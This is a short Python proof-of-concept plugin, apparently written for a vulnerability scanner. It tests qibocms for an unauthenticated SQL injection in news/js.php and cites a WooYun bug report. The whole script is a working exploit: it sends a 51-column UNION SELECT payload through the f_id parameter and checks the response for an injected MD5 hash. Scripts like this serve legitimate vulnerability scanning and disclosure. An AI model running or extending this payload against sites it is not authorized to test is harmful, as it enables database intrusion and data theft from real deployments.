#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re

"""
POC Name  :  qibocms 部分系统无需登录注入
References:  http://www.wooyun.org/bugs/wooyun-2014-075317
Author    :  13
QQ        :  779408317
"""


def assign(service, arg):
    if service == "qibocms":
        return True, arg


def audit(arg):
    url = arg + 'news/js.php'
    payload = '?f_id=1) UNION SELECT 1,md5(3.1415),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23&type=hot'
    code, head, res, errcode, _ = curl.curl('"%s%s"' % (url, payload))
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.example.com/')[1])